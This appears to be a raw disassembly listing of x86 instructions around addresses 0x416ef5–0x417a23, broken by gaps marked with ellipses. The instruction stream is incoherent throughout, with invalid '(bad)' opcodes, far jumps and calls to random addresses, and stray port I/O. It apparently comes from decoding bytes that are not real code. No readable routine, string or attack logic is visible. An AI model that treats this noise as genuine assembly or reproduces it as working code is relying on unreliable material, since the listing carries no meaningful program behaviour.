  416ef5:	xor    eax,ebp
  416ef7:	fwait
  416ef8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416efa:	(bad)  
  416efb:	sbb    dl,al
  416efd:	pusha  
  416efe:	add    ebx,DWORD PTR [ebx+ebx*2]
  416f01:	mov    ss,WORD PTR [edx-0x21a03ce1]
  416f07:	jp     0x416ec1
  416f09:	jo     0x416ecb
  416f0b:	imul   edi,DWORD PTR [eax-0x3f940600],0xffffff9d
  416f12:	jmp    0x416f33
  416f14:	pop    ebx
  416f15:	push   eax
  416f16:	data16 lods al,BYTE PTR ds:[esi]
  416f18:	mov    al,0x50
  416f1a:	pop    esi
  416f1b:	scas   al,BYTE PTR es:[edi]
  416f1c:	pop    esp
  416f1d:	push   0x5b20e9
  416f22:	rcr    DWORD PTR [edi],0x5f
  416f25:	add    cl,ch
  416f27:	pop    es
  416f28:	into   
  416f29:	add    ecx,ebp
  416f2b:	pop    ds
  416f2c:	sar    BYTE PTR fs:[ebp+0x2d43a136],0x1f
  416f34:	pop    ebx
  416f35:	add    cl,ch
  416f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f38:	push   ds
  416f39:	cld    
  416f3a:	mov    ecx,0xeb67b7c5
  416f3f:	xor    ch,BYTE PTR [edi]
  416f41:	clc    
  416f42:	sbb    DWORD PTR [edi],0xffffffb8
  416f45:	jno    0x416f34
  416f47:	adc    cl,BYTE PTR [edi-0x53]
  416f4a:	mov    dl,0xd8
  416f4c:	mov    bh,0xa
  416f4e:	sub    DWORD PTR [eax],eax
	...
  416f78:	fwait
  416f79:	popa   
  416f7a:	std    
  416f7b:	je     0x416f84
  416f7d:	rol    BYTE PTR [ebx-0x1646cf02],0x19
  416f84:	sub    DWORD PTR [edi],ebp
  416f86:	clc    
  416f87:	shl    DWORD PTR [ebp+0x69cefd50],0xb8
  416f8e:	cmp    eax,0x43a02028
  416f93:	mov    ebp,0xe9005b18
  416f98:	mov    ds:0x7619fc1e,al
  416f9d:	mov    bh,0x67
  416f9f:	jmp    0x416f69
  416fa1:	inc    ecx
  416fa2:	add    BYTE PTR [esi-0x302a453],bl
  416fa8:	add    BYTE PTR ds:0x9b14e93f,ah
  416fae:	or     eax,0xfd440900
  416fb3:	inc    DWORD PTR [ebp+0x55d84476]
  416fb9:	pop    ebx
  416fba:	add    BYTE PTR [eax],al
  416fbc:	mov    edx,0x4501d9f7
  416fc1:	pop    ebx
  416fc2:	add    bh,bh
  416fc4:	jbe    0x416f7d
  416fc6:	mov    es,WORD PTR [ebp-0x2b]
  416fc9:	dec    ebp
  416fca:	jb     0x416fd4
  416fcc:	loop   0x416fc5
  416fce:	loope  0x416f97
  416fd0:	mov    BYTE PTR [ebx+0x5b45fffd],al
  416fd6:	lds    eax,FWORD PTR [ebp-0x1f]
  416fd9:	pop    esi
	...
  417002:	add    BYTE PTR [eax],al
  417004:	add    BYTE PTR ds:0x5f04476,dh
  41700a:	pop    ebx
  41700b:	add    BYTE PTR [eax],al
  41700d:	cmp    dh,dh
  41700f:	icebp  
  417010:	add    ch,dh
  417012:	pop    edx
  417013:	add    BYTE PTR [ebp-0xb28d48],cl
  417019:	js     0x417069
  41701b:	in     eax,0xe5
  41701d:	push   es
  41701e:	pop    ebx
  41701f:	add    BYTE PTR [ebx],cl
  417021:	xor    eax,0x708315cb
  417026:	data16 std 
  417028:	jae    0x416ff6
  41702a:	dec    edi
  41702b:	je     0x417021
  41702d:	inc    edx
  41702e:	mov    ch,0xe0
  417030:	dec    eax
  417031:	hlt    
  417032:	pop    esi
  417033:	lds    eax,FWORD PTR [ebp-0x77]
  417036:	pop    ecx
  417037:	add    BYTE PTR [eax],al
  417039:	lds    eax,FWORD PTR [ebx+0x6af8c706]
  41703f:	std    
  417040:	push   DWORD PTR [ebp+0x7175fd5a]
  417046:	dec    edi
  417047:	adc    al,0xa3
  417049:	dec    esi
  41704a:	call   0xe81b:0xe6c50afd
  417051:	sbb    al,0xa2
  417053:	sbb    bh,dh
  417055:	add    DWORD PTR [ecx-0x2a],0xffffff9a
  417059:	out    0x82,eax
  41705b:	add    al,0x0
  41705d:	call   0x8755851f
  417062:	jns    0x417025
  417064:	call   FWORD PTR [edx-0x41]
  417067:	and    al,BYTE PTR [edi+0x0]
	...
  417092:	ffree  st(3)
  417094:	add    al,BYTE PTR [eax]
  417096:	sbb    al,0x44
  417098:	cmp    BYTE PTR [eax+esi*2-0x3c],0x8d
  41709d:	or     al,BYTE PTR [ebx-0x71]
  4170a0:	or     eax,0x291fb1fe
  4170a5:	mov    ebx,DWORD PTR [edi]
  4170a7:	les    eax,FWORD PTR [ecx]
  4170a9:	push   DWORD PTR [ecx+0x1d73296f]
  4170af:	les    eax,FWORD PTR [ecx]
  4170b1:	cld    
  4170b2:	dec    edi
  4170b3:	test   BYTE PTR [edx-0x2],bl
  4170b6:	adc    edx,DWORD PTR [ebp+0x14]
  4170b9:	icebp  
  4170ba:	mov    edx,0x990efc8b
  4170bf:	mov    eax,ds:0x28fbfe14
  4170c4:	clc    
  4170c5:	or     dl,bh
  4170c7:	les    edi,FWORD PTR [esi+0x66]
  4170ca:	jmp    0x1c4:0x1db711ac
  4170d1:	add    BYTE PTR [ebx+0x19],bh
  4170d4:	cmp    eax,edx
  4170d6:	imul   ebp,DWORD PTR [ecx],0x8fe08220
  4170dc:	mov    ah,0x57
  4170de:	xor    al,0xb7
  4170e0:	add    eax,DWORD PTR [ecx+0x1c]
  4170e3:	pushf  
  4170e4:	xchg   esi,eax
  4170e5:	add    bh,bl
  4170e7:	hlt    
  4170e8:	sahf   
  4170e9:	inc    ebx
  4170eb:	inc    ebx
  4170ec:	push   es
  4170ed:	add    BYTE PTR [esp+ebx*4],bl
  4170f0:	shl    BYTE PTR [eax],cl
  4170f2:	fwait
  4170f3:	pop    edx
  4170f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f5:	sbb    al,0x0
	...
  41711f:	nop
  417120:	scas   eax,DWORD PTR es:[edi]
  417121:	sahf   
  417122:	adc    eax,DWORD PTR [ebx-0x7ded315c]
  417128:	ret    0xeb8d
  41712b:	jp     0x4170e2
  41712d:	repnz inc ebx
  41712f:	out    dx,eax
  417130:	dec    ecx
  417131:	(bad)  
  417132:	sub    eax,0xff76b643
  417137:	mov    ds:0x204ae12e,eax
  41713c:	xlat   BYTE PTR ds:[ebx]
  41713d:	mov    ah,0xc4
  41713f:	push   ebx
  417140:	pop    edx
  417141:	out    0x3,eax
  417143:	sbb    al,0x43
  417145:	call   0x3f9c8d4e
  41714a:	ret    0xb611
  41714d:	inc    esi
  41714e:	addr16 dec eax
  417150:	sub    DWORD PTR [eax+0x331f6303],ebp
  417156:	add    eax,0x80e75b1d
  41715b:	pusha  
  41715c:	mov    bh,0xb7
  41715e:	adc    cl,BYTE PTR [eax-0x72]
  417161:	call   0x1c05:0x8fbd0bc4
  417168:	pop    ebx
  417169:	loop   0x4171ae
  41716b:	jo     0x4171bb
  41716d:	push   es
  41716e:	fxch   st(0)
  417170:	sub    BYTE PTR [eax-0x22990bfd],ch
  417176:	adc    ah,dl
  417178:	pushf  
  417179:	in     al,0x38
  41717b:	dec    esi
  41717c:	sbb    ah,bh
  41717e:	add    ebx,DWORD PTR [ebx+ebx*2]
  417181:	out    0x1b,eax
	...
  4171ab:	add    BYTE PTR [ecx+0x57],ch
  4171ae:	(bad)  
  4171af:	adc    bh,BYTE PTR [ebx-0x45ed0f8a]
  4171b5:	inc    ebx
  4171b6:	sbb    eax,0xcf5b5ccb
  4171bb:	cmp    DWORD PTR [eax-0x1f49ff4c],esi
  4171c1:	cwde   
  4171c2:	push   ebx
  4171c3:	bound  edi,QWORD PTR [ebx]
  4171c5:	and    al,0x58
  4171c7:	adc    edx,ebx
  4171c9:	pop    ecx
  4171ca:	aas    
  4171cb:	jmp    0xaa409be7
  4171d0:	cs inc edx
  4171d2:	add    BYTE PTR [ecx-0x16ffa520],al
  4171d8:	out    0xb3,eax
  4171da:	std    
  4171db:	jmp    0xee0413ff
  4171e0:	pop    ds
  4171e1:	or     ebx,DWORD PTR [eax+0x1]
  4171e4:	push   cs
  4171e5:	pop    edx
  4171e6:	aas    
  4171e7:	jmp    0x2a409c13
  4171ec:	cs cmp al,0xb1
  4171ef:	jmp    0x417249
  4171f1:	mov    ah,0xe5
  4171f3:	and    DWORD PTR [eax],0x3d51005b
  4171f9:	mov    ch,0xfd
  4171fb:	ds pop es
  4171fd:	and    esi,ebx
  4171ff:	ss push cs
  417201:	mov    esp,0xb52e36ed
  417206:	call   0xfdf6994b
  41720b:	push   0xffffffec
  41720d:	iret   
  41720e:	dec    ebx
  41720f:	test   al,0x0
	...
  417239:	pop    ds
  41723a:	pop    ebx
  41723b:	je     0x41722d
  41723d:	mov    ds:0xd8b29976,al
  417242:	mov    bl,0xfd
  417244:	jne    0x41725b
  417246:	mov    ah,0x13
  417248:	push   edx
  417249:	mov    ds:0x2426001a,al
  41724e:	mov    edx,0x5a182848
  417253:	add    cl,ch
  417255:	lahf   
  417256:	mov    ebx,0xb52dd515
  41725b:	call   0xfdf69d53
  417260:	add    BYTE PTR [esi-0x4f97aa12],al
  417266:	pop    esi
  417267:	aas    
  417268:	add    BYTE PTR [ebp-0x34],ch
  41726b:	add    bl,al
  41726d:	retf   0x3556
  417270:	add    DWORD PTR [ebp+0x7507b757],eax
  417276:	push   edi
  417277:	add    BYTE PTR [ebx],dh
  417279:	(bad)  
  41727a:	push   ecx
  41727b:	lock or DWORD PTR [edi-0x71fd8ca5],0x5c
  417283:	jmp    0xff190071
  417288:	(bad)  
  417289:	jmp    0x6749:0xcafa7256
  417290:	add    ch,ch
  417292:	xchg   ebx,eax
  417293:	add    BYTE PTR [eax],al
  417295:	xor    eax,0x8925fe73
  41729a:	fadd   DWORD PTR [eax+0x0]
	...
  4172c5:	add    dl,ch
  4172c7:	mov    ebx,0x5784815d
  4172cc:	std    
  4172cd:	and    eax,0x40d861
  4172d2:	jmp    0xfd5e:0xc48165bb
  4172d9:	and    eax,0x40dda9
  4172de:	sub    bh,BYTE PTR [edx+0x5eb4816d]
  4172e4:	std    
  4172e5:	and    eax,0x40dd91
  4172ea:	sbb    bh,BYTE PTR [edx+0x5eb48175]
  4172f0:	std    
  4172f1:	and    eax,0x40dd69
  4172f6:	retf   0x7db9
  4172f9:	add    DWORD PTR [edi+edx*2],0xdd4125fd
  417300:	inc    eax
  417301:	add    BYTE PTR [ecx+ecx*4],bl
  417304:	out    0x87,al
  417306:	popf   
  417307:	add    DWORD PTR [edi+edi*8],0xfffffff9
  41730b:	daa    
  41730c:	add    BYTE PTR [eax+0x1c],0xf1
  417310:	out    0x8f,al
  417312:	popf   
  417313:	add    DWORD PTR [edi+edi*8],0x41
  417317:	or     BYTE PTR [edx-0x1906e3c0],al
  41731d:	xchg   edi,eax
  41731e:	popf   
  41731f:	add    DWORD PTR [edi+edi*8],0x39
  417323:	sub    BYTE PTR [edx-0x191ee3c0],al
  417329:	lahf   
	...
  417352:	add    BYTE PTR [ebp+0x41ff0483],bl
  417358:	sbb    BYTE PTR [edx-0x19d6e3c0],al
  41735e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41735f:	popf   
  417360:	add    DWORD PTR [edi+edi*8],0xfffffff9
  417364:	mov    DWORD PTR [edx-0x19eee3c0],0x2039daf
  41736e:	inc    DWORD PTR [ecx]
  417370:	enter  0x4082,0x1c
  417374:	sbb    esi,esp
  417376:	mov    bh,0x9d
  417378:	add    eax,DWORD PTR [edx]
  41737a:	(bad)  
  41737b:	stc    
  41737c:	daa    
  41737d:	add    BYTE PTR [eax+0x1c],0x81
  417381:	out    0xbf,al
  417383:	popf   
  417384:	add    al,BYTE PTR [edx]
  417386:	inc    DWORD PTR [ecx+0x78]
  417389:	add    BYTE PTR [eax+0x1c],0x49
  41738d:	out    0xc7,al
  41738f:	popf   
  417390:	add    al,BYTE PTR [edx]
  417392:	(bad)  
  417393:	cmp    DWORD PTR [eax-0x7e],ebp
  417396:	inc    eax
  417397:	sbb    al,0xb1
  417399:	jecxz  0x41736a
  41739b:	popf   
  41739c:	add    al,BYTE PTR [edx]
  41739e:	inc    DWORD PTR [ecx]
  4173a0:	dec    eax
  4173a1:	add    BYTE PTR [eax+0x1c],0x5b
  4173a5:	out    0xe9,al
  4173a7:	repz fld TBYTE PTR [eax]
  4173aa:	add    al,0xc3
  4173ac:	ja     0x417361
  4173ae:	test   DWORD PTR [ebx+ebx*2-0x32],ebx
  4173b2:	jmp    0x46a4f8a
	...
  4173df:	add    BYTE PTR [ebx+0x5c85c377],ch
  4173e5:	pop    ebx
  4173e6:	mov    dh,0xe9
  4173e8:	sbb    ebx,0x28
  4173eb:	add    al,0x93
  4173ed:	ja     0x417382
  4173ef:	test   esp,ebx
  4173f1:	pop    edx
  4173f2:	sahf   
  4173f3:	jmp    0x46a4f6b
  4173f8:	jnp    0x417471
  4173fa:	xchg   ebx,eax
  4173fb:	test   esp,ebx
  4173fd:	pop    edx
  4173fe:	xchg   cl,ch
  417400:	jae    0x4173dd
  417402:	sub    BYTE PTR [ebx+eiz*2],al
  417405:	ja     0x41747a
  417407:	test   esp,ebx
  417409:	pop    edx
  41740a:	outs   dx,BYTE PTR ds:[esi]
  41740b:	jmp    0x3ea4f63
  417410:	dec    ebx
  417411:	ja     0x4173f6
  417413:	sbb    esp,0x23e9565a
  417419:	(bad)  [eax-0xc88ccfd]
  41741f:	sbb    esp,0x13e93e5a
  417425:	(bad)  [eax-0x2c88e4fd]
  41742b:	sbb    DWORD PTR [ebx+ebx*2+0x26],0xa8dd33e9
  417433:	add    eax,DWORD PTR [ebx]
  417435:	ja     0x41742a
  417437:	sbb    DWORD PTR [ebx+ebx*2+0xe],0xa8dd13e9
  41743f:	add    ebp,ebx
  417441:	jbe    0x417406
  417443:	add    DWORD PTR [eax],0x0
	...
  41746d:	pop    esp
  41746e:	pop    ebx
  41746f:	add    dh,dh
  417471:	les    edi,FWORD PTR [eax-0x7e]
  417474:	test   al,0x1f
  417476:	mov    al,0x23
  417478:	sbb    DWORD PTR [esi-0x4b21ffe5],ebx
  41747e:	ins    BYTE PTR es:[edi],dx
  41747f:	sub    BYTE PTR [eax],0x20
  417482:	mov    al,0x23
  417484:	adc    DWORD PTR [esi-0x4b39ffe5],ebx
  41748a:	je     0x41740e
  41748c:	sub    BYTE PTR [eax],bl
  41748e:	mov    al,0x23
  417490:	sub    DWORD PTR [esi-0x7b51ffe5],ebx
  417496:	sbb    al,0x82
  417498:	sub    BYTE PTR [eax],ah
  41749a:	mov    al,0x23
  41749c:	sub    eax,0x96001b9e
  4174a1:	test   BYTE PTR [edx+eax*4],cl
  4174a4:	sub    BYTE PTR [eax],bl
  4174a6:	mov    al,0x23
  4174a8:	and    DWORD PTR [esi+0x747e001b],ebx
  4174ae:	adc    al,0x82
  4174b0:	sub    BYTE PTR [eax],ah
  4174b2:	mov    al,0x23
  4174b4:	or     DWORD PTR [esi+0x3466001b],ebx
  4174ba:	cmp    al,0x82
  4174bc:	test   al,0x1f
  4174be:	mov    al,0x23
  4174c0:	rcr    DWORD PTR [ebp+0x444e001b],0x44
  4174c7:	sub    BYTE PTR [eax-0x46dc4fe1],0x9d
  4174ce:	sbb    eax,DWORD PTR [eax]
  4174d0:	add    BYTE PTR ss:[eax],al
	...
  4174f7:	add    BYTE PTR [eax],al
  4174f9:	add    BYTE PTR [esp+ebp*1],al
  4174fc:	sub    BYTE PTR [eax-0x5edc4fe1],0x9d
  417503:	sbb    al,BYTE PTR [eax]
  417505:	push   ds
  417506:	hlt    
  417507:	xor    eax,DWORD PTR [edx+0x23b01fa8]
  41750d:	gs popf 
  41750f:	sbb    al,BYTE PTR [eax]
  417511:	add    BYTE PTR [edx],ah
  417513:	ret    
  417514:	mov    DWORD PTR [edx+0x25fd5bb4],eax
  41751a:	jne    0x4174f6
  41751c:	inc    eax
  41751d:	add    dl,al
  41751f:	mov    bh,0x95
  417521:	xor    ah,0x56
  417524:	std    
  417525:	and    eax,0x40dd41
  41752a:	shl    BYTE PTR [edi+0x5704829d],cl
  417530:	std    
  417531:	and    eax,0x40dc99
  417536:	bound  esi,QWORD PTR [edi+0x574482a5]
  41753c:	std    
  41753d:	and    eax,0x40dd11
  417542:	ret    0xb1b7
  417545:	xor    BYTE PTR [edi+edx*2],0xfd
  417549:	and    eax,0x40dccd
  41754e:	mov    ds:0x3482b9b7,al
  417553:	push   edi
  417554:	std    
  417555:	and    eax,0x40dcb5
  41755a:	shl    BYTE PTR [edi+0x82c1],cl
	...
  417584:	add    BYTE PTR [eax],al
  417586:	add    BYTE PTR [edi+edx*2],al
  417589:	std    
  41758a:	and    eax,0x40dd0d
  41758f:	loop   0x417548
  417591:	leave  
  417592:	add    BYTE PTR [ebx+ebx*2-0x230ada03],0x40
  41759a:	add    dl,ah
  41759c:	mov    bh,0xd1
  41759e:	xor    BYTE PTR [ebx+ebx*2-0x3],0x25
  4175a3:	sub    eax,0x420040d9
  4175a8:	mov    dh,0xdd
  4175aa:	xor    BYTE PTR [edx+ebx*2-0x26e6da03],0x40
  4175b2:	add    BYTE PTR [ecx+edi*1],bl
  4175b5:	enter  0x1823,0x41
  4175b9:	or     al,0x1
  4175bb:	imul   ebp,DWORD PTR [ecx+ecx*2+0x1c41c63],0x80c420c2
  4175c6:	neg    DWORD PTR [eax]
  4175c8:	aas    
  4175c9:	stc    
  4175ca:	mov    bh,0x1e
  4175cc:	les    eax,FWORD PTR [ecx]
  4175ce:	add    dh,bl
  4175d0:	mov    eax,0xbcb48301
  4175d5:	mov    es,WORD PTR [edi]
  4175d7:	je     0x417591
  4175d9:	add    DWORD PTR [eax],eax
  4175db:	sbb    al,0x2
  4175dd:	push   es
  4175de:	add    BYTE PTR [edi+0x247cf19c],bl
  4175e4:	sub    al,0x3
  4175e6:	add    BYTE PTR [esp+eax*8],bl
  4175e9:	aas    
  4175ea:	add    eax,DWORD PTR [eax]
	...
  417614:	sbb    al,0x41
  417616:	or     DWORD PTR [edi],ebx
  417618:	add    DWORD PTR [ecx+ecx*2+0x1c41c07],ebp
  41761f:	ret    0xc418
  417622:	xor    bh,0xdc
  417625:	push   esi
  417626:	cld    
  417627:	mov    bh,0x16
  417629:	les    eax,FWORD PTR [ecx]
  41762b:	add    BYTE PTR [esi-0x40],bl
  41762e:	add    DWORD PTR ds:0x1c49c,edi
  417634:	leave  
  417635:	stos   DWORD PTR es:[edi],eax
  417636:	dec    ecx
  417637:	or     ebx,DWORD PTR [esp+eax*8]
  41763a:	add    edx,eax
  41763c:	and    ah,al
  41763e:	into   
  41763f:	call   FWORD PTR [esp+eax*8]
  417642:	add    DWORD PTR [ebp+0x14],edi
  417645:	fdiv   st(3),st
  417647:	jmp    DWORD PTR [ebx]
  417649:	les    edi,FWORD PTR [edi]
  41764b:	add    ebx,DWORD PTR [edi+eiz*4]
  41764e:	add    DWORD PTR [edx],eax
  417650:	sbb    al,0xc4
  417652:	mov    es,WORD PTR [edi]
  417654:	les    ebx,FWORD PTR [edx-0x9]
  417657:	add    ebx,DWORD PTR [ebx+ebx*2]
  41765a:	sub    DWORD PTR [edi],eax
  41765c:	sbb    al,0x70
  41765e:	out    0x7,eax
  417660:	sbb    al,0x5b
  417662:	mov    ebx,?
  417664:	mov    bl,0x48
  417666:	out    0x3,eax
  417668:	sbb    al,0x99
  41766a:	jecxz  0x41766f
  41766c:	sbb    DWORD PTR [ebx-0x21],ebx
  41766f:	add    ebx,DWORD PTR [eax+esi*1]
  417672:	fisttp WORD PTR [ebx+0x2f]
  417675:	pop    ebx
  417676:	out    0x3,eax
	...
  4176a0:	add    dh,bl
  4176a2:	push   esi
  4176a3:	out    0xc8,eax
  4176a5:	mov    ebx,0x3103e75d
  4176aa:	arpl   WORD PTR [edi-0x1852540e],cx
  4176b0:	inc    ebp
  4176b1:	pop    ds
  4176b2:	pop    ebx
  4176b3:	cld    
  4176b4:	add    edi,DWORD PTR [ebx+ebx*2]
  4176b7:	out    0x88,eax
  4176b9:	sbb    esi,ebx
  4176bb:	iret   
  4176bc:	add    ebx,DWORD PTR [ebx+ebx*2]
  4176bf:	test   eax,0xe7701c00
  4176c4:	ret    
  4176c5:	jnp    0x417674
  4176c7:	adc    al,0xfc
  4176c9:	stos   DWORD PTR es:[edi],eax
  4176ca:	push   eax
  4176cb:	out    0x3,eax
  4176cd:	sbb    al,0x99
  4176cf:	jmp    0x4176d4
  4176d1:	and    DWORD PTR [ebx+0x67],ebx
  4176d4:	add    al,0x1c
  4176d6:	xor    bh,bl
  4176d8:	dec    ebx
  4176d9:	aaa    
  4176da:	pop    ebx
  4176db:	out    0x3,eax
  4176dd:	pop    esi
  4176de:	push   esi
  4176df:	out    0xd6,eax
  4176e1:	push   esp
  4176e2:	outs   dx,DWORD PTR ds:[esi]
  4176e3:	out    0x3,eax
  4176e5:	sbb    eax,0x5c68e65b
  4176ea:	fistp  WORD PTR [ebx+0x28e209fc]
  4176f0:	inc    esi
  4176f1:	pop    ds
  4176f2:	pop    ebx
  4176f3:	push   0xffffff85
  4176f5:	aaa    
  4176f6:	push   edi
  4176f7:	add    cl,ch
  4176f9:	pop    ds
  4176fa:	lods   al,BYTE PTR ds:[esi]
  4176fb:	jae    0x4176c9
  4176fd:	mov    bl,bl
  4176ff:	adc    ch,ch
  417701:	pop    ds
  417702:	pop    ebx
  417703:	xchg   DWORD PTR [eax+0x0],ebp
	...
  41772e:	or     BYTE PTR [ecx+0x0],bl
  417731:	jmp    0xedc10d15
  417736:	jmp    0x4176e4
  417738:	std    
  417739:	icebp  
  41773a:	pop    ds
  41773b:	pop    ebx
  41773c:	add    BYTE PTR [eax-0x5f],dh
  41773f:	pop    esp
  417740:	add    al,0xe9
  417742:	pop    ds
  417743:	fdivr  DWORD PTR [ebp+eax*8-0x35]
  417747:	lods   al,BYTE PTR ds:[esi]
  417748:	mov    dh,BYTE PTR [eax-0x49]
  41774b:	pop    eax
  41774c:	add    cl,ch
  41774e:	stos   DWORD PTR es:[edi],eax
  41774f:	popa   
  417750:	mov    ch,al
  417752:	sbb    DWORD PTR [ebx+0x5b27a9fe],ebx
  417758:	ret    0x1fed
  41775b:	mov    ebx,DWORD PTR [edi]
  41775d:	stos   DWORD PTR es:[edi],eax
  41775e:	fwait
  41775f:	lods   al,BYTE PTR ds:[esi]
  417760:	sub    BYTE PTR [eax+0x7b],0x58
  417764:	add    cl,ch
  417766:	push   ss
  417767:	daa    
  417768:	sbb    esi,DWORD PTR [edx-0x68]
  41776b:	pop    esp
  41776c:	add    al,0xe9
  41776e:	pop    ds
  41776f:	loop   0x4177f0
  417771:	icebp  
  417772:	jae    0x417720
  417774:	std    
  417775:	sub    edi,ebx
  417777:	ficomp DWORD PTR [ebp*8-0x16f7a4e1]
  41777e:	pop    ds
  41777f:	pop    ebx
  417780:	xchg   DWORD PTR [eax+0x4f],ebp
  417783:	pop    eax
  417784:	add    cl,ch
  417786:	retf   0x18e2
  417789:	in     eax,dx
  41778a:	pop    ds
  41778b:	pop    ebx
  41778c:	ror    BYTE PTR [eax],1
  41778e:	jecxz  0x417768
  417790:	jg     0x417787
	...
  4177ba:	add    BYTE PTR [ebx],dh
  4177bc:	lods   al,BYTE PTR ds:[esi]
  4177bd:	std    
  4177be:	dec    esi
  4177bf:	mov    WORD PTR [edi-0x77],cs
  4177c2:	add    BYTE PTR [edi+eiz*4+0x2f050001],dh
  4177c9:	sbb    BYTE PTR [eax],0x1
  4177cc:	pop    eax
  4177cd:	add    BYTE PTR [eax+0x42],al
  4177d0:	xlat   BYTE PTR ds:[ebx]
  4177d1:	sbb    DWORD PTR [esi*8+0x5000857],eax
  4177d8:	pop    eax
  4177d9:	xchg   DWORD PTR [ecx-0x2540b],eax
  4177df:	jle    0x417810
  4177e1:	adc    eax,0x8a57f504
  4177e6:	add    edi,eax
  4177e8:	pop    ss
  4177e9:	sti    
  4177ea:	sar    BYTE PTR ds:0x818bc157,0x8b
  4177f1:	add    DWORD PTR [ebx+0x5501bb01],ecx
  4177f7:	repz jmp 0xf07a6e2f
  4177fd:	std    
  4177fe:	mov    cl,ch
  417800:	aad    0xe6
  417802:	add    DWORD PTR [esi+ecx*2-0x158e72bd],eax
  417809:	cmp    al,0x84
  41780c:	retf   0x83ed
  41780f:	retf   
  417810:	push   edi
  417811:	mov    ebx,0xfe61baff
  417816:	lea    ebx,[eax]
  417818:	mov    al,0x71
  41781a:	jb     0x417852
  41781c:	inc    BYTE PTR cs:[ecx]
	...
  417847:	add    ah,bl
  417849:	ret    0x1
  41784c:	jne    0x41782a
  41784e:	sbb    BYTE PTR [ebx+0x1a6c4],cl
  417854:	inc    ebp
  417855:	xor    BYTE PTR [eax+0x574118],al
  41785b:	inc    eax
  41785c:	int3   
  41785d:	pop    ds
  41785e:	sbb    DWORD PTR [eax*2+0x1c818757],eax
  417865:	mov    dl,0xfd
  417867:	jmp    FWORD PTR [ebx]
  417869:	cmp    BYTE PTR [ecx+0x1c21817],al
  41786f:	neg    dh
  417871:	mov    bl,0x8d
  417873:	or     DWORD PTR [esi+0xadb038c],esp
  417879:	jbe    0x4178f7
  41787b:	pop    ss
  41787c:	div    DWORD PTR [esi+0xb1d1f31]
  417882:	call   0x8ef5948a
  417887:	sbb    BYTE PTR [edi+0x1c03f433],dl
  41788d:	mov    ah,0x7a
  41788f:	xor    BYTE PTR [eax+eax*8],0x1
  417893:	add    BYTE PTR [ebx+edi*1+0x49],bl
  417897:	sbb    esp,DWORD PTR [eax]
  417899:	mov    ah,0x1
  41789b:	mov    DWORD PTR [ebp-0x4400025c],ebx
  4178a1:	sub    eax,0xb4181782
  4178a6:	add    DWORD PTR [edx-0x2d349fc],ecx
	...
  4178d4:	add    bh,bl
  4178d6:	ret    
  4178d7:	sbb    eax,DWORD PTR [edx+0x1779b38a]
  4178dd:	or     DWORD PTR [esi],eax
  4178df:	lods   al,BYTE PTR ds:[esi]
  4178e0:	add    BYTE PTR [ebp-0x7c000268],dh
  4178e6:	inc    edi
  4178e7:	jmp    0xfde61676
  4178ec:	push   DWORD PTR [ebx+0x3b]
  4178ef:	adc    BYTE PTR [edi],0x20
  4178f2:	mov    ah,0x1
  4178f4:	inc    eax
  4178f5:	xchg   ebp,eax
  4178f6:	sbb    esp,ebp
  4178f8:	add    ebx,DWORD PTR [esp+esi*4]
  4178fb:	jp     0x41787d
  4178fd:	sub    al,0xb8
  4178ff:	add    DWORD PTR [eax],eax
  417901:	xchg   edi,eax
  417902:	xor    ebp,ecx
  417904:	add    ebx,DWORD PTR [ebx+ebx*2]
  417907:	out    0x11,eax
  417909:	pop    ebp
  41790a:	pop    esp
  41790b:	sar    ebp,cl
  41790d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41790e:	dec    ebx
  41790f:	jmp    0x5fdea249
  417914:	repz ss pop ebp
  417917:	pop    ss
  417918:	jecxz  0x417936
  41791a:	hlt    
  41791b:	(bad)  
  41791d:	adc    ebp,DWORD PTR [edx-0x24691544]
  417923:	xlat   BYTE PTR ds:[ebx]
  417924:	inc    DWORD PTR [ebx]
  417926:	stos   BYTE PTR es:[edi],al
  417927:	jo     0x4178ab
  417929:	adc    ebx,DWORD PTR [edi-0x19]
  41792c:	add    ebx,DWORD PTR [esp+edx*8+0x50]
  417930:	out    0x1f,eax
  417932:	pop    ebx
  417933:	out    0x7a,eax
  417935:	pushf  
  417936:	dec    edx
  417937:	jmp    0x41793c
	...
  417961:	add    BYTE PTR [esi+edx*8],bl
  417964:	jo     0x417951
  417966:	pop    ds
  417967:	pop    ebx
  417968:	out    0x33,eax
  41796a:	cld    
  41796b:	or     DWORD PTR [ebp-0x18a1225a],ecx
  417971:	mov    dl,0x50
  417973:	(bad)  
  417974:	dec    ebx
  417975:	loopne 0x41799a
  417977:	adc    DWORD PTR [edx],ebx
  417979:	inc    esp
  41797a:	push   edx
  41797b:	fmulp  st(4),st
  41797d:	imul   DWORD PTR [ecx]
  41797f:	pusha  
  417980:	test   bh,dh
  417982:	fwait
  417983:	test   eax,0x7f177ae7
  417988:	fstp   TBYTE PTR [edx-0x6e]
  41798b:	jne    0x417941
  41798d:	jns    0x41798e
  41798f:	jle    0x417978
  417991:	jns    0x4179ad
  417993:	ffreep st(2)
  417995:	nop
  417996:	adc    edx,esi
  417998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417999:	jnp    0x4179ec
  41799b:	xlat   BYTE PTR ds:[ebx]
  41799c:	jb     0x4179a2
  41799e:	sbb    al,0x5b
  4179a0:	out    0xc9,eax
  4179a2:	xor    eax,0xddbce52f
  4179a7:	fild   WORD PTR [eax]
  4179a9:	mov    al,ds:0xa981afad
  4179ae:	inc    ebx
  4179af:	faddp  st(7),st
  4179b1:	fdiv   QWORD PTR [edi]
  4179b3:	fadd   st(0),st
  4179b5:	jmp    0x4179cd
  4179b7:	pop    ebp
  4179b8:	sub    DWORD PTR [ecx],0x6a46202b
  4179be:	test   BYTE PTR [ebp+0x1c],bh
  4179c1:	call   0x9f9f1072
	...
  4179ee:	add    ah,al
  4179f0:	add    eax,0xd41fe5c2
  4179f5:	push   esp
  4179f6:	add    eax,0x72560e1c
  4179fb:	adc    DWORD PTR [ecx-0x570c2e7a],esp
  417a01:	std    
  417a02:	jmp    0x6341d526
  417a07:	out    0xdc,al
  417a09:	(bad)  
  417a0a:	neg    BYTE PTR [ebx+0x78]
  417a0d:	(bad)  
  417a0e:	call   0x75ca8a32
  417a13:	jmp    0x417a61
  417a15:	sub    esi,0xa6032eca
  417a1b:	mov    dl,0xa8
  417a1d:	std    
  417a1e:	jmp    0xae6b1459
  417a23:	das    
